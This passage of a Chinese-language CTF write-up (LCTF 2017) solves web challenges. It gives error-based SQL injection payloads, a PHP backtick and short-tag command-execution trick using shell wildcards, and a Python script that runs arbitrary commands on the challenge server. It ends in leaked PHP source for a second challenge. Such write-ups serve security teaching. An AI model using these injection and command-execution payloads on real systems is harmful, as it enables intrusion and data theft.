+http://182.254.246.93/</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuyZG6P9oMBDjLqMuG6VOgVSFEzWegYKRuicb4ibhqn6X8pich1dI42KOMg/0?wx_fmt=png" class="" data-ratio="0.43720190779014306" data-w="629" data-type="png" src="../Images/4551278e82b2f9d93541862d17190da4.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuyZG6P9oMBDjLqMuG6VOgVSFEzWegYKRuicb4ibhqn6X8pich1dI42KOMg/0?wx_fmt=png"/></p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">Solution</h2><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">SQL注入</h3><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDu14PibmC8AnG7eiaPQvfjtGYP2TgibME6PS63OFBwOUWbmG8HqTeUpIDFg/0?wx_fmt=png" class="" data-ratio="0.5948717948717949" data-w="585" data-type="png" src="../Images/18599998d72fce73b4fc64be0e3828e0.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDu14PibmC8AnG7eiaPQvfjtGYP2TgibME6PS63OFBwOUWbmG8HqTeUpIDFg/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">这是第一关。查看源代码后，有如下tips：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --&gt;</code></pre><p style="margin-bottom: 1.2em !important;">所以目标很明确。</p><p style="margin-bottom: 1.2em !important;">经过测试，过滤了information等关键字。而union，select等则没有过滤。</p><p style="margin-bottom: 1.2em !important;">参考mysql注入可报错时爆表名、字段名、库名</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">获取表名</h4><p style="margin-bottom: 1.2em !important;">文章中利用的是Polygon()函数，这个也被过滤了。我换了linestring()来报错注入。</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">http://182.254.246.93/entrance.php
+
+POST: pro_id=1 and linestring(pro_id)</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuOict5Ms4Ou48hKN4Ahe97Lg6JI7buy1L51T86BF0mh0ohDO22mEdISw/0?wx_fmt=png" class="" data-ratio="0.35968028419182946" data-w="1126" data-type="png" src="../Images/0433bfe5e6489402cd58a7520fce0973.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuOict5Ms4Ou48hKN4Ahe97Lg6JI7buy1L51T86BF0mh0ohDO22mEdISw/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">得到如下信息：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">数据库名：youcanneverfindme17
+表名：product_2017ctf
+部分字段名：pro_id</code></pre><p style="margin-bottom: 1.2em !important;">除了linestring和Polygon外，其他同样能用来报错获取得到当前表名和字段的还有：</p><ol style="" class=" list-paddingleft-2"><li><p>multiPolygon(id)</p></li><li><p>multilinestring(id)</p></li><li><p>GeometryCollection(id)</p></li><li><p>MultiPoint(id)</p></li></ol><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDumV7lKhJfjRib36DqUicsic4reEdkrx1Oiae2sN6Wg5Onvpypjiazib0E8Zyg/0?wx_fmt=png" class="" data-ratio="0.4560344827586207" data-w="1160" data-type="png" src="../Images/ab0782156b38bf21f39365326f80dec3.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDumV7lKhJfjRib36DqUicsic4reEdkrx1Oiae2sN6Wg5Onvpypjiazib0E8Zyg/0?wx_fmt=png"/></p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">查询字段名</h4><p style="margin-bottom: 1.2em !important;">其实这一步，可以跳过。因为利用union搭配别名子查询，可以达到在不知道字段名的时候进行注入。</p><p style="margin-bottom: 1.2em !important;">为了完整性，这里试一下注出字段名。</p><p style="margin-bottom: 1.2em !important;">利用orangetw大佬的提过的技巧</p><p style="margin-bottom: 1.2em !important;">基本的原理是子查询中不允许出现相同的表名，本地环境测试如下：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuSic7wSAhsuib5x7GqlEFClQfRFmX33JVJicib7XXvmAJ34FuFRDKyicuYiag/0?wx_fmt=png" class="" data-ratio="0.530933633295838" data-w="889" data-type="png" src="../Images/7905e88c83336571177f8122862b0607.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuSic7wSAhsuib5x7GqlEFClQfRFmX33JVJicib7XXvmAJ34FuFRDKyicuYiag/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">之后可以利用using来逐步爆出字段名：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuPRkZlQNAfiauH5LslJ8mVNMcTQyE6I0e4Sick6VlZJ6tiaosibOx5a9QZg/0?wx_fmt=png" class="" data-ratio="0.49765698219306465" data-w="1067" data-type="png" src="../Images/d16ad64d9d2b01dd0a0b868cd2e48216.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuPRkZlQNAfiauH5LslJ8mVNMcTQyE6I0e4Sick6VlZJ6tiaosibOx5a9QZg/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">举一反三：</p><p style="margin-bottom: 1.2em !important;">第一步：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c);
+Duplicate column name 'pro_name'</code></pre><p style="margin-bottom: 1.2em !important;">第二步：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name)) as c);
+Duplicate column name 'owner'</code></pre><p style="margin-bottom: 1.2em !important;">第三步：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);
+Duplicate column name 'd067a0fa9dc61a6e'</code></pre><p style="margin-bottom: 1.2em !important;">得到如下信息：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">库：youcanneverfindme17
+表：product_2017ctf
+字段: pro_id  pro_name owner,d067a0fa9dc61a6e</code></pre><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">查询数据</h4><p style="margin-bottom: 1.2em !important;">参考文章： http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">POST:pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf)e limit 1 offset 3 )),NULL,NULL--
+
+product name:7195ca99696b5a896.php</code></pre><p style="margin-bottom: 1.2em !important;">最终获得完整的结构与数据如下：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">product_id:  1,2,3
+product_name: car,iphone11,nextentrance
+owner:Tom John Boss
+d067a0fa9dc61a6e:wobuzaizheli nextnext 7195ca99696b5a896.php</code></pre><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">其他</h4><p style="margin-bottom: 1.2em !important;">在做的过程，有想利用innodb引擎来注入，不过好像没啥用2333</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">POST:
+pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select table_name from innodb_table_stats)),NULL,NULL--
+
+'youcanneverfindme17.innodb_table_stats' doesn't exist
+数据库：youcanneverfindme17</code></pre><p style="margin-bottom: 1.2em !important;">根据tips，得到下一个入口地址:d067a0fa9dc61a6e7195ca99696b5a896.php<br/></p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">PHP的命令执行</h3><p style="margin-bottom: 1.2em !important;">http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuncibKwvoE7o1z5QAdYERbibASvJsVxqQSnNSGMtOnq12LtLfDpt0CLVA/0?wx_fmt=png" class="" data-ratio="0.5128617363344051" data-w="622" data-type="png" src="../Images/109507567b486791e576e04a19eb9727.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuncibKwvoE7o1z5QAdYERbibASvJsVxqQSnNSGMtOnq12LtLfDpt0CLVA/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">到了这里就跟 32c3 2015 ctf-TinyHosting的题目很像了。</p><p style="margin-bottom: 1.2em !important;">就几个知识点展开说一说。</p><p style="margin-bottom: 1.2em !important;">一个是php的短标签。当php.ini的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">short_open_tag=on</code>时，PHP支持短标签，默认情况下为off。当开启后能执行<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">&lt;? ?&gt;</code>标签内的php语句：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">chybeta@ubuntu:/var/www/html$ cat test.php
+&lt;? echo "chybeta\n";?&gt;
+chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php
+chybeta
+chybeta@ubuntu:/var/www/html$</code></pre><p style="margin-bottom: 1.2em !important;">另一个知识点是php的反引号命令执行，php会反引号内的内容作为shell命令执行，效果与 shell_exec()同。</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">chybeta@ubuntu:/var/www/html$ cat test.php
+&lt;? $temp = `date`; echo $temp;?&gt;
+chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php
+Wed Nov 22 22:01:34 CST 2017
+chybeta@ubuntu:/var/www/html$</code></pre><p style="margin-bottom: 1.2em !important;">第三个知识点是关于php的echo，echo有个快捷写法，可以在打开标记前直接用一个等号。见下：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php
+chybeta
+chybeta@ubuntu:/var/www/html$ vim test.php
+chybeta@ubuntu:/var/www/html$ cat test.php
+&lt;?="chybeta\n";
+chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php
+chybeta
+chybeta@ubuntu:/var/www/html$</code></pre><p style="margin-bottom: 1.2em !important;">我们的需求：执行命令，得到回显。结合上面三个知识点，在7个字节的限制下，比如构造如下（）：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?=`w`;</code></pre><p style="margin-bottom: 1.2em !important;">（题外话：命令<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">w</code>用于显示已经登陆系统的用户列表）</p><p style="margin-bottom: 1.2em !important;">运行结果：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuNgwia9ZubuRpSPibibC7Eq7ZngoDnL7JJzLFuGcib1sN3eDRcF3mHSkD5Q/0?wx_fmt=png" class="" data-ratio="0.1566502463054187" data-w="1015" data-type="png" src="../Images/a5976c8f5aaf6ac7115cfcf90f43a9cf.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuNgwia9ZubuRpSPibibC7Eq7ZngoDnL7JJzLFuGcib1sN3eDRcF3mHSkD5Q/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">不过怎么执行任意命令呢？这里用到第四个知识点，shell中的通配符<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">*</code>会将符合模式的文件列出来，之后执行，详情可见这里Shell 通配符。所以当文件夹下有如下文件：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">bash z.sh</code></pre><p style="margin-bottom: 1.2em !important;">而我在shell中直接键入一个<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">*</code>即：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">chybeta@ubuntu: *</code></pre><p style="margin-bottom: 1.2em !important;">shell会匹配并进行替换，完成替换后实际执行的命令为：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">chybeta@ubuntu: bash c.sh</code></pre><p style="margin-bottom: 1.2em !important;">由于这属于shell后台自动完成就不展示了。</p><p style="margin-bottom: 1.2em !important;">接着要考虑一点，我们需要用<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">*</code>来利用文件名执行任意命令，因此在文件名的构造顺序上需要注意。比如我们最终要在文件下生成这三个文件:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">bash c.sh z.php</code></pre><p style="margin-bottom: 1.2em !important;">才能成功的执行c.sh。</p><p style="margin-bottom: 1.2em !important;">附上利用脚本：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">import requests
+import re
+
+url = "http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php"
+user_agent = "xxx"
+
+while 1:
+    command = raw_input("input command: ")
+    t = requests.post(url, headers = {'User-agent': user_agent }, data = {"filename":"z.php", "content":"&lt;?=`*`;"}).text
+    [path] = re.findall('files.*/zzz.php', t)
+
+    requests.post(url, headers = {'User-agent': user_agent }, data = {"filename":"bash", "content":'anything'})
+    requests.post(url, headers = {'User-agent': user_agent }, data = {"filename":"c.sh", "content": command})
+    url1 = "http://182.254.246.93/"
+    r = requests.get(url1+path)
+    print r.text</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuj0S2lCEXs4VMianGfLjWiaQRJria7h8RdCU95AMyqlkPADYDcC45Ky7vA/0?wx_fmt=png" class="" data-ratio="0.8008534850640113" data-w="703" data-type="png" src="../Images/6052bb970c98bc44e8e7b660ac7f1c66.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuj0S2lCEXs4VMianGfLjWiaQRJria7h8RdCU95AMyqlkPADYDcC45Ky7vA/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">flag:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">$flag = "LCTF{n1ver_stop_nev2r_giveup}";</code></pre><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">小结</h2><ul style="" class=" list-paddingleft-2"><li><p>基于报错的sql注入：</p></li><ul style="list-style-type: square;" class=" list-paddingleft-2"><li><p>获取库名，表名，列名，数据</p></li><li><p>join using</p></li></ul><li><p>php技巧:</p></li><ul style="list-style-type: square;" class=" list-paddingleft-2"><li><p>短标签</p></li><li><p>反引号</p></li><li><p>echo缩写</p></li></ul><li><p>shell通配符</p></li></ul><h1 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.6em;border-bottom: 1px solid rgb(221, 221, 221);">萌萌哒报名系统</h1><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">Task</h2><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">天依花了一整天的时间用IDE开发了一个报名系统，现在她睡着了，难道你们不想做点什么嘛XD?
+http://123.206.120.239/</code></pre><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">Solution</h2><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">源码泄露</h3><p style="margin-bottom: 1.2em !important;">根据题目信息，用了IDE,比如phpstrom，以前做百度杯时碰到过。尝试访问:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">http://123.206.120.239/.idea/workspace.xml</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDu9laq2RJ0BA0u9y2hsqgWkF0Mfl2n6vRdEOAoia8viaIuAn08FIpibeq4Q/0?wx_fmt=png" class="" data-ratio="0.3709677419354839" data-w="806" data-type="png" src="../Images/71b79e0c76378b103527d0dac1560af3.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDu9laq2RJ0BA0u9y2hsqgWkF0Mfl2n6vRdEOAoia8viaIuAn08FIpibeq4Q/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">发现源码包：xdcms2333.zip。下载下来进行审计。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">基本流程梳理</h3><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">regisrer.php</h4><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+    include('config.php');
+    try{
+        $pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass);
+    }catch (Exception $e){
+        die('mysql connected error');
+    }
+    $admin = "xdsec"."###".str_shuffle('you_are_the_member_of_xdsec_here_is_your_flag');
+    $username = (isset($_POST['username']) === true &amp;&amp; $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
+    $password = (isset($_POST['password']) === true &amp;&amp; $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');
+    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';
+
+    if (strlen($username) &gt; 16 || strlen($username) &gt; 16) {
+        die('Invalid input');
+    }
+
+    $sth = $pdo-&gt;prepare('SELECT username FROM users WHERE username = :username');
+    $sth-&gt;execute([':username' =&gt; $username]);
+    if ($sth-&gt;fetch() !== false) {
+        die('username has been registered');
+    }
+
+    $sth = $pdo-&gt;prepare('INSERT INTO users (username, password) VALUES (:username, :password)');
+    $sth-&gt;execute([':username' =&gt; $username, ':password' =&gt; $password]);
+
+    preg_match('/^(xdsec)((?:###|\w)+)$/i', $code, $matches);
+    if (count($matches) === 3 &amp;&amp; $admin === $matches[0]) {
+        $sth = $pdo-&gt;prepare('INSERT INTO identities (username, identity) VALUES (:username, :identity)');
+        $sth-&gt;execute([':username' =&gt; $username, ':identity' =&gt; $matches[1]]);
+    } else {
+        $sth = $pdo-&gt;prepare('INSERT INTO identities (username, identity) VALUES (:username, "GUEST")');
+        $sth-&gt;execute([':username' =&gt; $username]);
+    }
+    echo '&lt;script&gt;alert("register success");location.href="./index.html"&lt;/script&gt;';</code></pre><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">login.php</h4><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+    session_start();
+    include('config.php');
+    try{
+        $pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass);
+    }catch (Exception $e){
+        die('mysql connected error');
+    }
+    $username = (isset($_POST['username']) === true &amp;&amp; $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
